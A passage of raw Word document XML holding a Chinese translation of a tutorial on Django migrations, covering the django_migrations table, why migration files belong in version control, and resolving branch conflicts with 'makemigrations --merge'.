      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="1094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63"/>
        <w:gridCol w:w="9681"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B61AC7" w:rsidRPr="002101A1" w14:paraId="709E70C4" w14:textId="77777777" w:rsidTr="006521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6FE4AD2"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4894165"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python manage.py makemigrations</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="09590E6F" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:after="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 xml:space="preserve">　　</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>django.db.utils.InternalError: (1060, "Duplicate column name 'addr_id'")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="388B7C49" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1"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运行</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="1094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31"/>
        <w:gridCol w:w="9713"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B61AC7" w:rsidRPr="002101A1" w14:paraId="28AA6B37" w14:textId="77777777" w:rsidTr="006521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A2BCCB1"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D5889C6"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python manage.py migrate --fake</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2CDFE13E" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1"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 xml:space="preserve">　然后重新运行</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="1094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539"/>
        <w:gridCol w:w="9405"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B61AC7" w:rsidRPr="002101A1" w14:paraId="409CE34E" w14:textId="77777777" w:rsidTr="006521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3D0CD35"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5D4140" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1" w:rsidRDefault="00B61AC7" w:rsidP="002437D1">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python manage.py migrate</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5DC903DF" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00EB10F9"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 xml:space="preserve">　　成功！</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A6685E" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00BC6A81" w:rsidRDefault="00B61AC7" w:rsidP="00BC6A81">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222226"/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="42"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC6A81">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222226"/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>Django中的migration冲突处理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21FE9646"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Migrantion 是 Django 最有用的的特性之一，但是对于我来说改变 Model 这是一个很可怕的任务。尽管能够阅读文档，我仍然很害怕 migration 的冲突或者丢失数据，或者需要手动处理 migration 文件，或者这样那样的事情。事实上，一旦理解它们，migration 是很酷的、很有用的。关于以上的问题你将不会有任何疑问。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ED7B0C7"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b/>
          <w:bCs/>
          <w:color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>翻译自 Oana Ratiu 的《</w:t>
      </w:r>
      <w:hyperlink r:id="rId146" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="002101A1">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Django Migrations and How to Manage Conflicts</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>》</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73A5A8B8"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我一直不能找到一些有价值的文章和文档，也许在某个地方，所有的方法都可以解决冲突。然而从来没有人在 Google 上仔细的搜索。在这些问题上我会尝试收集一些不同角度。主要的是，我会尝试去解释你可以在项目中找到的那些 migrations，如何解决 migration 的冲突，和一些数据迁移的。我会假定你是有 Django、Python 和 GIT 的使用经验。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3546804C" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1" w:rsidRDefault="00D96E02" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId147" w:anchor="module-django.db.migrations" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="00B61AC7" w:rsidRPr="002101A1">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>在 Django 的文档中对 migrations 的简单定义</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00B61AC7" w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB4BB59" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="EEF0F4"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Migrantion 是 Django 根据你的想法，改变 Model （添加字段、删除 Model 等）到数据库中的方法。它们大多数是自动的，但是你需要知道什么时候执行 migrations，执行它们时候，你可能会遇到的问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C843A11"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无论你选择是的 PostgreSQL, MySQL 还是 SQLite，你都可以使用一套命令去管理数据库。我将会较多的谈论关于 </w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>makemigrations</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> 命令，它会基于你对 Model 的改动，然后创建新的 migrations。还有就是 </w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> 命令，它会使 migrations 生效，完成后使它们失效和列出它们状态。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B49E61"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r w:rsidRPr="00BC6A81">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F4F4F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="33"/>
        </w:rPr>
        <w:t>我的 migrations 在哪里？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="572CC0FC"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在你的工程中，你可以找到 migrations 文件（.py 的文件）在 migrations 的文件夹里。确保文件夹中有 </w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>__init__.py</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> 这个文件，如果没有这个文件，那么还是没有效果。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF463E7"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在你的 settings 文件中每个已安装的 app，你都可以找到对应得 migration 文件。例如，你可以在</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>…/lib/python2.7/site-packages/django/contrib/auth/migrations</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> 找到 User 的 migration。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA98563"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你可以在你的数据库中找到 </w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django_migrations</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="4D4D4D"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> 表，它列出了已经生效的 migrations。这是为了在切换分支的时候产生不同的 migrations，让你忘记执行到了哪里。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E6EF32B"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my_data=# select * from django_migrations;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1173880C"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id |      app      |          name           |            applied            </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1836FC85"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10822AB9"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     ...       |          ...            |             ...             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CADBBB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10 | myapp         | 0001_initial            | 2016-03-17 07:22:30.329448+00</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60076ABE"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11 | myapp         | 0002_auto_20160316_0909 | 2016-03-17 07:22:30.956985+00</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1796E04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12 | myapp         | 0003_auto_20160318_1345 | 2016-03-18 13:45:23.895839+00</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1225E04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     ...       |          ...            |             ...             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521AB6C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(16 rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E2AABC" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="390" w:lineRule="atLeast"/>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my_data=#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43BCE236"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r w:rsidRPr="00BC6A81">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F4F4F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="33"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>首先，为什么要保存 migrations 在项目中？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="403F0B62" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="0060088A" w:rsidRDefault="00B61AC7" w:rsidP="0060088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0088A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>也许你会说：为什么不在 Python / Django 的项目中 GIT-ignore 所有的 migrations，让每个开发者创建自己的 migration 文件？这样做可以避免掉一些不必要的操作。很好，这就是写这篇文章的一个理由。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA4794E" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="0060088A" w:rsidRDefault="00B61AC7" w:rsidP="0060088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0088A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>在继续之前，我希望你把在每次改变 model 改变后生成的 migrations 提交并推送到你仓库。这样所有的开发者都会拥有一份相同的 migrations。我必须强调这一点。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39CE82D9" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="0060088A" w:rsidRDefault="00B61AC7" w:rsidP="0060088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0088A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>为什么这是如此重要的？想象一下，如果没有 migrations 在你的项目中，团队里的每个成员都要在本地生成自己的 migrations 文件。然而，我的项目最终总会在产品环境下，部署的时候会创建初始化的 migration 同时还会 migrate 数据库。在之后的时间，如果 model 改变我还会重新部署一次，这样又会在产品服务器上生成新的 migration。 但是如果现在发生一些事情，难道我还要有第二台产品服务器？再次部署，创建新的 migration 文件然后 migrate 我的数据库。这样一来，第一台产品服务器就有两份 migration 文件，然而第二台产品服务器只有一份 migration 文件，这一个巨大矛盾。我不能截断任何数据库的改变和执行数据库回滚。从根本上来说，如果你想回滚数据库，那就只能在每个服务器上。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="427E8CAF" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="0060088A" w:rsidRDefault="00B61AC7" w:rsidP="0060088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0088A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>所以，请保证 migrations 在你的项目中。你也许会遭遇冲突，但是如果你想要你的数据库版本，活着想要回滚数据库，在你的生活中，做一个开发者比监测 migrations 容易的多。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE7E4DA"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r w:rsidRPr="00BC6A81">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F4F4F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="33"/>
        </w:rPr>
        <w:t>Migration 冲突</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A43396A"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假设我们有一个 Django 的项目，一份初始化 migration，同时也使用 GIT。我们使用 GIT，所以我们使用分支。我们使用分支，所以在 并分支的时候可能有 migrations 的冲突。当然，在团队中应该知道每个人在做什么，避免修改相同的 models。团队合作是重要的，但是一个人不可能总是避免 migrations 的冲突。因此千万别吓坏了，然后删除数据库，我就是这样干了很多次。它们是可以被很简单的修复，为了做到这一点，我将会解释一些简单的例子，但是它们是很有用的方法。你可以在你需求上选择一个最好的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FFE7684"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我们需要一份数据库的初始化 migration（Django 将会比较任何一个 model 去初始化 migration，而不是当前的数据库状态），我们不需要手动的修改数据库。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40158C15"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假设，我们有一个 UserProfile 的 model 同时还有两个分支：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15ABCB36" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:before="120"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分支1，一个开发者添加一个 “address” 的字段到 UserProfile Model 中，这样就有了 “migration 0003_userprofile_address.py”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9F9853" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:before="120"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分支2，我想添加一个 “age” 字段到 UserProfile Model 中，这样就有了 “0003_userprofile_age.py”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A3B3D1"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我的分支是分支2，我想合并分支1到分支2，在执行 GIT merge 后，在分支2中不但有我的 migrations 还有从分支1中来的 “0003_userprofile_address.py”。那么问题来了，这两个 migration 文件都试图修改相同的 model，而且都是以 “0003_” 命名的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E3648F2"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这里有三种可用的解决方法。前面两种是我推荐的，但是劝告你最好避免是使用第三种方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43993498"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r w:rsidRPr="00BC6A81">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F4F4F"/>
          <w:kern w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="33"/>
        </w:rPr>
        <w:t>方法1：使用 -merge</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67838C66"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无论何时，在你使用这个方法之前，这都是非常容易的，因为 Django 会自动合并。因此，如果你是有经验丰富的开发者，你事先会知道这种方法是会失败的。考虑到这个选项只对非常简单的 model 的变化非常有用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CAE1573"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那么，为了让 Django 合并你的 migrations，你应该遵循以下步骤：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D79A1EF" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>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尝试执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>python manage.py migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> (在这个时候，Django 将会查看这些冲突，然后告诉你执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>python manage.py makemigrations –merge</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4640C4" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>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执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>python manage.py makemigrations –merge</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，migrations 将会自动被合并；你将会创建一个新的 migration 叫 </w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>0004_merge.py</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> 被放在migrations 文件夹中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="282F6B42" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>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执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>python manage.py migrate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E328477"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lastRenderedPageBreak/>
        <w:t>$ python manage</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py migrate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="331099A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CommandError</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Conflicting migrations detected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0003_userprofile_age</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0003_userprofile_address </w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="DejaVu Sans Mono" w:hint="eastAsia"/>
          <w:color w:val="ABB2BF"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="282C34"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:eastAsia="宋体" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="ABB2BF"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="282C34"/>
        </w:rPr>
        <w:t xml:space="preserve"> myapp</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="DejaVu Sans Mono" w:hint="eastAsia"/>
          <w:color w:val="ABB2BF"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="282C34"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE28B82"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To fix them run </w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="DejaVu Sans Mono" w:hint="eastAsia"/>
          <w:color w:val="ABB2BF"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="282C34"/>
        </w:rPr>
        <w:t>'python manage.py makemigrations --merge'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="740EC1C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py makemigrations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merge</w:t>
      </w:r>
    </w:p>
